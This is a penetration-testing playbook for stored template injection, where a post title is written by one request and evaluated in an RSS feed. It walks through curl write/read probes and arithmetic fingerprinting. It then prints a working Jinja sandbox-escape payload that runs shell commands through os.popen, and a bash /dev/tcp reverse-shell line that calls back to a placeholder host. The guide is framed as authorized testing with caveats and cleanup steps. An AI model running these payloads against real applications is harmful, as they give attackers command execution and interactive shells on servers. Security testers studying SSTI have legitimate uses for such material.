# Stored input evaluated by a later renderer

Use this for authorized testing where a field is stored by one request and rendered by another, such as a post title emitted in an RSS archive. Require the observed form/API contract, intended account/session, selected field and both write/read routes. A comment containing an archive link is a route lead; a blank browser page can still carry XML in its response body. Fetch and inspect the actual bytes.

Keep hostname routing consistent with the application. Use the entrypoint's `--resolve` pattern when DNS is unavailable; preserve the hostname in the URL. A browser hosts-file change is not necessary for curl's per-request mapping. Confirm the selected response differs from the default virtual host before attributing its behavior to this application.

## Follow the stored value to its evaluation point

Create a distinctive benign marker through the observed form and find it in the selected read response. Establish whether the field is reflected on the home page, feed, notification or another renderer; the write response may never evaluate it. Maintain the same account, session and intended object, and account for expiration/deletion or caching. A short-lived test account can disappear during analysis; a redirect to login is not a payload verdict.

Define `post_url`/`render_url` as the observed routes, `title_field`/`content_field` as the actual form parameter names, `field_file` as a fresh UTF-8 file holding the selected title bytes, `marker` as a benign identifying content value, and `cookie_jar` as the current private session jar. Use distinct fresh response files for each probe. For a form POST:

~~~bash
curl --silent --show-error --connect-timeout 5 --max-time 30 \
  --cookie "$cookie_jar" --cookie-jar "$cookie_jar" \
  --data-urlencode "$title_field@$field_file" \
  --data-urlencode "$content_field=$marker" \
  --dump-header "$post_headers" --output "$post_body" \
  --write-out 'status=%{http_code}\n' "$post_url"
~~~

Supply the observed CSRF parameter/header when required. Do not infer parameter names or authentication from a visible label. This command selects a form POST and encodes the field once. For a JSON endpoint, use the package's API reference and a serializer instead. Check the write's status/body and selected object before retrying an ambiguous response; a 500 need not undo storage. Review any redirect rather than blindly resubmitting the POST.

Retrieve the alternate rendering with the same routing and session:

~~~bash
curl --silent --show-error --connect-timeout 5 --max-time 30 \
  --cookie "$cookie_jar" --dump-header "$render_headers" \
  --output "$render_body" --write-out 'status=%{http_code}\n' "$render_url"
~~~

Save raw body and the matching field/item, not just a browser screenshot. HTML escaping and template evaluation are separate boundaries: passing a value into a fixed template ordinarily treats it as data, while compiling user-controlled text as template source can evaluate its expressions. XML output is still a template surface. Parsing an invalid XML excerpt fails independently of whether an expression evaluated.

Use a baseline marker and distinct arithmetic expressions one at a time. Place exact bytes in `field_file`, for example `printf '%s' '{{7*7}}' > "$field_file"`; quoted shell strings prevent local expansion. The following outcomes are **illustrative**, with default delimiters:

| Selected input / result | Interpretation and next decision |
|---|---|
| `${7*7}` remains literal | This renderer did not evaluate that syntax. Try a supported alternative or inspect the actual engine; it does not establish absence of SSTI. |
| `{{7*7}}` becomes `49` only at the feed | Evidence of expression evaluation at that sink. Vary the operands and correlate the same stored object to rule out a static/cached number. |
| `{{7*'7'}}` becomes `7777777` | Consistent with Jinja string repetition. Treat it as an engine hypothesis alongside source/configuration evidence, not a unique fingerprint. |
| Literal braces, escaped text, blank output or a template error | Check the actual read route, account lifetime, field placement, engine delimiters and sandbox/undefined behavior. A failure in one context is not a verdict on every renderer. |

Arithmetic evidence does not establish OS command execution, privilege or an unsandboxed engine. In Jinja, a configured sandbox restricts private/internal attribute access even when arithmetic works. Prefer actual engine/context evidence before choosing the next probe; do not blindly copy a numeric subclass index from another Python process.

## Authorized Jinja process-execution branch

When the requested test includes command execution, the classic Python object-graph route can work in an **unsandboxed** Jinja context. It follows an object's class/base to currently loaded subclasses, identifies `warnings.catch_warnings`, and reaches its module's builtins. This depends on that class being loaded and private attributes/callables being accessible. A sandbox rejection, missing class or different builtins representation calls for context/source investigation, not a universal bypass claim.

A selected identity command can be placed in the same stored field, then triggered at the verified renderer:

~~~jinja
{% for x in ().__class__.__base__.__subclasses__() %}{% if x.__name__ == 'catch_warnings' %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{% endif %}{% endfor %}
~~~

This adapted command executes on the server and reads its stdout; `os.popen` invokes a shell. An observed numeric UID/GID ties execution to that process context. Empty output can reflect an unavailable object path, stderr-only failure, a different builtins object or filtering; it is not proof the command ran successfully. The title may render repeatedly, so later reads can rerun it. Replace the stored test field or remove the owned test post when the task is finished.

For an explicitly requested callback, the same command argument can invoke Bash with `bash -c 'bash -i >& /dev/tcp/CALLBACK_IP/CALLBACK_PORT 0>&1'` after replacing both placeholders and starting the controlled listener. The outer command string, Jinja string literal, form encoding and inner Bash parse are separate layers; construct the exact field bytes first and verify them. Bash must exist on the server and support network redirections; this is not portable POSIX sh. A long-running child can hold the render request open. A curl timeout does not establish that the child stopped: correlate the tracked callback and actual identity before retrying, then end the owned process/session. A raw callback is not a PTY or authenticated transport.

Finish with baseline/probe bytes, the write/read pair, actual observed transformations and the supported engine/execution conclusion. Keep account state, privilege and cleanup evidence separate; do not describe a planned payload as a received shell.

Primary references: [curl form/body encoding](https://curl.se/docs/manpage.html), [Jinja expressions and lookup rules](https://jinja.palletsprojects.com/en/stable/templates/), [sandbox boundaries](https://jinja.palletsprojects.com/en/stable/sandbox/), [Python subclass discovery](https://docs.python.org/3.12/library/stdtypes.html#class.__subclasses__), [catch_warnings module linkage](https://github.com/python/cpython/blob/3.12/Lib/warnings.py), [os.popen](https://docs.python.org/3.12/library/os.html#os.popen).
